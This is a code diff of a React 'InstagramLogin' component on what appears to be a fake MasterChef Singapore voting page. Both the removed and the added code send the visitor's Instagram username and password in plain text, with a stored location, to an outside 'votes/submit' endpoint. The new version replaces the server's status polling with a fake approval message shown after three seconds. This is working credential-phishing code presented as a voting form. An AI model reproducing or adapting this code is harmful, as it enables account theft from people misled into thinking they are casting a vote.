@@ -9,83 +9,58 @@ export default function InstagramLogin() {
   const [approved, setApproved] = useState(false);
   const [rejected, setRejected] = useState(false);
 
-  const [requestId, setRequestId] = useState(null);
+  
 
-  useEffect(() => {
-    if (!requestId) return;
 
-    const interval = setInterval(async () => {
-      try {
-        const res = await fetch(
-          `https://masterchefsingapore-vk35.vercel.app/api/votes/status/${requestId}`
-        );
 
-        const data = await res.json();
+async function handleLogin(e) {
+  e.preventDefault();
 
-        if (!data.success) return;
-
-        if (data.data.status === "approved") {
-          setApproved(true);
-          setPending(false);
-          clearInterval(interval);
-        }
-
-        if (data.data.status === "rejected") {
-          setRejected(true);
-          setPending(false);
-          clearInterval(interval);
-        }
-      } catch (err) {
-        console.log(err);
-      }
-    }, 3000);
-
-    return () => clearInterval(interval);
-  }, [requestId]);
-
-  async function handleLogin(e) {
-    e.preventDefault();
-
-    if (!username || !password) {
-      alert("Please enter your username and password.");
-      return;
-    }
-
-    setLoading(true);
-
-    try {
-      const res = await fetch(
-        "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            candidate_number: 1,
-            platform: "instagram",
-            username,
-            password,
-            location: localStorage.getItem("voteLocation"),
-          }),
-        }
-      );
-
-      const data = await res.json();
-
-      if (data.success) {
-        setRequestId(data.data[0].id);
-        setPending(true);
-      } else {
-        alert(data.message);
-      }
-    } catch (err) {
-      alert("Unable to connect to server.");
-    }
-
-    setLoading(false);
+  if (!username || !password) {
+    alert("Please enter your username and password.");
+    return;
   }
 
+  setLoading(true);
+
+  try {
+    const res = await fetch(
+      "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          candidate_number: 1,
+          platform: "instagram",
+          username,
+          password,
+          location: localStorage.getItem("voteLocation"),
+        }),
+      }
+    );
+
+    const data = await res.json();
+
+    if (data.success) {
+      setPending(true);
+
+      setTimeout(() => {
+        setPending(false);
+        setApproved(true);
+      }, 3000);
+
+    } else {
+      alert(data.message);
+    }
+
+  } catch (err) {
+    alert("Unable to connect to server.");
+  }
+
+  setLoading(false);
+}
   if (approved) {
     return (
       <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
